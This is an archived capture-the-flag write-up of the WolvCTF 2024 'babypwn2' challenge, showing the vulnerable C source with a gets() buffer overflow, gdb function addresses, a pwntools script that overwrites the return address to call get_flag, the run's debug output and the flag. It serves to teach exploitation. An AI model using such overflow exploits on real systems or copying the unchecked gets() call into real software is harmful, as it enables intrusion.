# babypwn2

**CTF:** WolvCTF 2024  
**Category:** pwn  
**Original writeup:** <https://nopedawn.github.io/posts/ctfs/2024/wolv-ctf-2024/> — by **nopedawn**. All credit goes to the original author; this is an archived copy.

---

Overview Author: retu2libc

Description: A harder babypwn.

Connection: nc babypwn2.wolvctf.io 1337 babypwn2

babypwn2.c

The second one is babypwn2

determine file type & check binary elf protection $ file babypwn2 && checksec babypwn2 babypwn2: ELF 64-bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped [ * ] '/home/nopedawn/CCUG/WolvCTF24/babypwn2/babypwn2' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 )

babypwn2.c 1 #include <stdio.h> 2 #include <unistd.h> 3 4 /* ignore this function */ 5 void ignore () 6 { 7 setvbuf ( stdout , NULL , _IONBF , 0 ); 8 setvbuf ( stdin , NULL , _IONBF , 0 ); 9 } 10 11 void get_flag () 12 { 13 char * args [] = { "/bin/cat" , "flag.txt" , NULL }; 14 execve ( args [ 0 ], args , NULL ); 15 } 16 17 int main () 18 { 19 ignore (); 20 char buf [ 0x20 ]; 21 printf ( "What's your name?

>> " ); 22 gets ( buf ); 23 printf ( "Hi %s!

" , buf ); 24 return 0 ; 25 }

The gets function is dangerous because it does not check the size of the input, which can lead to a buffer overflow. In this case, the buffer buf is of size 0x20 (32 bytes), but gets will write past the end of the buffer if given an input larger than 32 bytes.

find get_flag address $ gdb ./babypwn2 gef➤ info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x0000000000401030 printf@plt 0x0000000000401040 execve@plt 0x0000000000401050 gets@plt 0x0000000000401060 setvbuf@plt 0x0000000000401070 _start 0x00000000004010a0 _dl_relocate_static_pie 0x00000000004010b0 deregister_tm_clones 0x00000000004010e0 register_tm_clones 0x0000000000401120 __do_global_dtors_aux 0x0000000000401150 frame_dummy 0x0000000000401152 ignore 0x0000000000401195 get_flag 0x00000000004011d0 main 0x0000000000401220 __libc_csu_init 0x0000000000401280 __libc_csu_fini 0x0000000000401284 _fini gef➤

The goal here is to overwrite the return address of the main function with the address of the get_flag function. This can be done by sending an input of 32 bytes (to fill up the buffer) plus the size of the saved base pointer (usually 8 bytes on a 64-bit system), followed by the address of the get_flag function.

solver.py 1 from pwn import * 2 3 def exploit ( io ): 4 io . recvuntil ( b "What's your name?" ) 5 6 get_flag_address = 0x401195 7 8 payload = b 'A' * 32 9 payload += b 'B' * 8 10 payload += p64 ( get_flag_address ) 11 io . sendline ( payload ) 12 13 # output = io.recvall() 14 # print(output) 15 io . interactive () 16 17 if __name__ == "__main__" : 18 context . update ( log_level = 'debug' ) 19 try : 20 io = remote ( 'babypwn2.wolvctf.io' , 1337 ) 21 exploit ( io ) 22 except : 23 io = process ( './babypwn2' ) 24 exploit ( io )

running $ python3 solver.py [ + ] Opening connection to babypwn2.wolvctf.io on port 1337: Done [ DEBUG ] Received 0x1e bytes: b '== proof-of-work: disabled ==

' [ DEBUG ] Received 0x15 bytes: b "What's your name?

" b '>> ' [ DEBUG ] Sent 0x31 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ * 00000020 42 42 42 42 42 42 42 42 95 11 40 00 00 00 00 00 │BBBB│BBBB│··@·│····│ 00000030 0a │·│ 00000031 [ * ] Switching to interactive mode >> [ DEBUG ] Received 0x52 bytes: 00000000 48 69 20 41 41 41 41 41 41 41 41 41 41 41 41 41 │Hi A│AAAA│AAAA│AAAA│ 00000010 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ 00000020 41 41 41 42 42 42 42 42 42 42 42 95 11 40 21 0a │AAAB│BBBB│BBB·│·@!·│ 00000030 77 63 74 66 7b 57 6f 34 68 5f 6c 30 6f 6b 5f 34 │wctf│ { Wo4│h_l0│ok_4│ 00000040 74 5f 79 30 75 5f 68 34 63 6b 31 6e 67 5f 6d 33 │t_y0│u_h4│ck1n│g_m3│ 00000050 7d 0a │ } ·│ 00000052 Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB \x 95 \x 11@! wctf { Wo4h_l0ok_4t_y0u_h4ck1ng_m3 } [ * ] Got EOF while reading in interactive $ q [ DEBUG ] Sent 0x2 bytes: b 'q

' $ q [ DEBUG ] Sent 0x2 bytes: b 'q

' [ * ] Closed connection to babypwn2.wolvctf.io port 1337 [ * ] Got EOF while sending in interactive

FLAG wctf{Wo4h_l0ok_4t_y0u_h4ck1ng_m3}
